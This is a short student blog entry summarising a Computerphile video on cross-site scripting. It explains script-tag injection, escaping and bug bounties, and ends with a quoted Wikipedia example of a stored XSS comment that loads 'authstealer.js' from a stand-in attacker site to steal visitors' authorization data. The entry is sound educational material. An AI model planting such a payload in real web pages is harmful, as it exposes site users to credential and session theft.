    <h1>Blog Entry #1</h1>
    <h2>9/2/2021</h2>

    <p>This week I watched <a href="https://www.youtube.com/watch?v=L5l9lSnNMxg" target="_blank">a Computerphile video on cross-site scripting.</a></p>
    <p>In this video, Tom Scott delves into a malicious trick that turns HTML and Javascript against themselves. 
        He first explained the basics of Javascript, which was helpful because I have no experience with it. Until watching
        this video, I had no idea it was a <i>supplement</i> to HTML. I always assumed it was a <i>replacement</i>.
        Javascript uses the &lt;script&gt; tag to run code in an HTML website. So when compiling an HTML document, the compiler knows
        to start executing Javascript code as soon as it sees that tag.</p>

    <p>Unfortunately, this can also apply to input text from the user! Meaning if there are no proper measures taken, the user
        can type the &lt;script&gt; tag into unprotected text input elements and begin running their own code. Luckily, this can be prevented by the 
        website developers by automatically escaping the relevant characters. However, it only takes one mistake to let malicious users
        have free rein over the site. Examples from the past include routing all site log-ins through 3rd party databases collecting
        userdata.
    </p>

    <p>To safeguard against this, most major companies have "bug bounty" programs. If a tech savvy user finds an exploit like this,
        they can report it to the developers for a reward. Facebook recently (well, recently in 2013 when the video was made) paid
        out a $12,000 bounty to a person who reported rather than exploited a cross-site scripting bug. I wouldn't be surprised if some people have made entire
        careers out of bug-hunting.
    </p>

    <h2>Examples</h2>
    <p>Here's an example from Wikipedia. Context: a user logs onto a news website where they can enter comments about the article. 
        They leave the following comment: </p>
    <p>I love the puppies in this story! They're so cute!&lt;script src="http://mallorysevilsite.com/authstealer.js"&gt;</p>
    <p>Now anyone who loads this article has their site authorization data sent to the malicious user's hidden server.</p>
